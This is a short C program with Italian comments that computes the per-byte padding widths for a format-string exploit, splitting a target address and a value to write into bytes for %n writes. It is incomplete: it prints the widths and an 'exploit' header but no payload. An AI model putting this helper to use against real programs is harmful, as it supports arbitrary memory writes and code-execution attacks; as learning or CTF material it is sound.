#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc ,char* argv[])
{
  unsigned int start, what, minus, res[5];
  int offset;
  unsigned int start_b[4], what_b[4]; 
  
  if( argc < 2 ) 
    { 
     printf("Usage: %s < number to format string > <START address to overwrite> <WHAT overwrite>", argv[0]); //[TODO] small parser   
     exit(0);
    }
  
  offset = atoi(argv[1]);
  start  = strtoul(argv[2], NULL, 0); 
  what   = strtoul(argv[3], NULL, 0);
   
  // spezzo nelle singole cifre decimali i due valori hex

  start_b[0] =   start & 0x000000ff ;
  start_b[1] = ( start & 0x0000ff00 ) >> 8;
  start_b[2] = ( start & 0x00ff0000 ) >> 16;
  start_b[3] = ( start & 0xff000000 ) >> 24;     
 
  what_b[3] = ( what & 0xff000000 ) >> 24;
  what_b[2] = ( what & 0x00ff0000 ) >> 16;
  what_b[1] = ( what & 0x0000ff00 ) >> 8;
  what_b[0] =   what & 0x000000ff ;
  
  int i; // indicatore byte trattato
  minus = 0x00000010; // 16 in decimale 
  for( i=0 ; i<4; i++ )
     {
      if( what_b[i] >= minus )
         res[i] = what_b[i] - minus; // tolgo 16, la lunghezza dei 4 indirizzi da sovrascrivere che corrispondono a byte gi√† contati per il %n
      else
         res[i] = ( what_b[i] + 0x00000100 ) - minus; 
 
      minus = what_b[i];  
      //printf("Now what_b is 0x%08x\n", what_b[i]);
     }
  
  for( i=0 ; i<4; i++ )
     {
      printf("0x%08x\n", res[i]);
     }

  puts("\nThis is your exploit:\n");
     
}
